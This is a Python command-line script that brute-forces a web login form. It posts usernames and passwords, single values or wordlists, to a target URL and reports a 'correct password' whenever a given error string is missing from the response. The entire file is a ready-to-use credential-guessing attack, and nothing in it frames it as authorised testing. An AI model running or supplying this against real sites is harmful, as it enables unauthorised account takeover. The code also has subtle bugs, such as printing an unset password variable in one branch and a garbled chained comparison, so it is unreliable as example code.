import requests
# from bs4 import BeautifulSoup
import argparse

parser = argparse.ArgumentParser(description="Brute force login page.")
parser.add_argument('-U', '--url', required=True, help='login page of target url')
parser.add_argument('-r', '--response', required=True, help='The response of an error message')
# parser.add_argument('-l', '--login', required=True, help='username')

user = parser.add_mutually_exclusive_group(required=True)
user.add_argument('-l', '--login', help='Set username')
user.add_argument('-L', '--loginlist', help='Set username list')

password = parser.add_mutually_exclusive_group(required=True)
password.add_argument('-p', '--password', help='Set password')
password.add_argument('-P', '--passwordlist', help='Set password list')

args = parser.parse_args()


url = args.url
login_username = args.login
login_username_list = args.loginlist
login_password = args.password
login_password_list = args.passwordlist

def login(username, password):

    r = requests.post(url, data = {
        "username": username,
        "password": password,
        "submit": "Login",
    })

    return r

def brute_force():

    if login_username_list:

        with open(login_username_list, "r") as i:
            usernames = [ line.strip() for line in i.read().split("\n") if line ]

        for username in usernames:
            
            if login_password_list:

                with open(login_password_list, "r") as h:
                    passwords = [ line.strip() for line in h.read().split("\n") if line ]

                for password in passwords:
                    # html_content = login("admin", password).text
                    # soup = BeautifulSoup(html_content, "lxml")
                    # response = soup.form.text
                    response = login(username, password).text
                    if args.response in response:
                        print(f"username {username} password {password}: Incorrect password")
                    else:
                        print(f"username {username} password {password}: Correct password")
                        return

            else:
                response = login(username, login_password).text

                if args.response in response:
                    print(f"username {username} password {login_password}: Incorrect password")
                else:
                    print(f"username {username} password {login_password}: Correct password")

    else:
        if login_password_list:

            with open(login_password_list, "r") as h:
                passwords = [ line.strip() for line in h.read().split("\n") if line ]

            for password in passwords:
                # html_content = login("admin", password).text
                # soup = BeautifulSoup(html_content, "lxml")
                # response = soup.form.text
                response = login(login_username, password).text
                if args.response in response in response:
                    print(f"username {login_username} password {login_password}: Incorrect password")
                else:
                    print(f"username {login_username} password {login_password}: Correct password")
                    return

        else:
            response = login(login_username, login_password).text

            if args.response in response:
                print(f"username {login_username} password {login_password}: Incorrect password")
            else:
                print(f"username {login_username} password {login_password}: Correct password")

brute_force()